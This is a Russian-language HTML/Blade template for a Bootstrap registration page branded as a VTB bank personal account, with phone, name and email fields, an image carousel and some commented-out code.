
<!doctype html>
<html lang="ru">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="css/login.css">



    <link rel="shortcut icon" href="img/vtb.jpg"/>


    <title>ВТБ личный кабинет</title>
</head>
<body>

<div class="container">

    <div class="row justify-content-start">

        <div class="col-4">
        </div>

        <div class="col-4 text-left">
            <h2>ВТБ: личный кабинет</h2>
        </div>

        <div class="col-4">
        </div>

    </div>


    <div class="row justify-content-start">
        <div class="col-4"></div>
        <div class="col-lg-4 col-md-6 col-xs-12">
            <hr/>
            <!-- 	<h3> Авторизация</h3>
              <hr/> -->

            <form method="POST" action="{{ route('register') }}">
                @csrf
                <div class="form-group row">
                    <label for="inputLogin" class="col-sm-4 col-form-label">Логин</label>
                    <div class="col-sm-8">
                        <input name="phone" type="text" class="phone form-control" id="inputLogin" data-toggle="tooltip" data-placement="top" title="Введите номер телефона">
                    </div>
                </div>

                <div class="form-group row">
                    <label for="name" class="col-sm-4 col-form-label">Имя</label>
                    <div class="col-sm-8">
                        <input name="name" type="text" class="form-control" id="name" data-toggle="tooltip" data-placement="top" title="Введите Имя">
                    </div>
                </div>

                <div class="form-group row">
                    <label for="email" class="col-sm-4 col-form-label">Email</label>
                    <div class="col-sm-8">
                        <input name="email" type="text" class="form-control" id="email" data-toggle="tooltip" data-placement="top" title="Введите email" >
                    </div>
                </div>


                <div class="form-group row">
                    <!--   	<div class="col-4"></div>
                    -->    <div class="col-4">
                        <button type="submit" class="btn btn-outline-primary" data-toggle="modal" data-target="#exampleModal"  id="enter" data-toggle="tooltip" data-placement="top" title="Ожидайте SMS-уведомление по номеру: ">Зарегистрироваться</button>
                    </div>
                </div>
            </form>



        </div>
        <!-- <div class="col-2 ">
          <p id= "antifrod" data-toggle="tooltip" title="Подумайте о безопасности вашего аккаунта!">Какой-то текст</p>
        </div>


        <div class="col-2"></div>
        </div> -->




        <div class="modal" tabindex="-1" role="dialog" id="myModal3">
            <div class="modal-dialog modal-md">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title"></h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
                            <ol class="carousel-indicators">
                                <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>
                                <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>
                                <li data-target="#carouselExampleIndicators" data-slide-to="2"></li>
                            </ol>
                            <div class="carousel-inner">
                                <div class="carousel-item active" data-interval="300">
                                    <img src="carusel\1.jpg" class="d-block w-100" alt="...">
                                </div>
                                <div class="carousel-item" data-interval="300">
                                    <img src="carusel\2.jpg" class="d-block w-100" alt="...">
                                </div>
                                <div class="carousel-item" data-interval="300">
                                    <img src="carusel\3.jpg" class="d-block w-100" alt="...">
                                </div>
                            </div>
                            <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
                                <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                                <span class="sr-only">Previous</span>
                            </a>
                            <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
                                <span class="carousel-control-next-icon" aria-hidden="true"></span>
                                <span class="sr-only">Next</span>
                            </a>
                        </div>

                    </div>
                </div>
            </div>
        </div>




    </div>






</div>









</div>





<!-- <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script> -->

<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.5/css/bootstrap.min.css" rel="stylesheet"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.3.7/js/tether.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.5/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.min.js"></script>
<script type="text/javascript" src="js/register.js"></script>

</body>
</html>
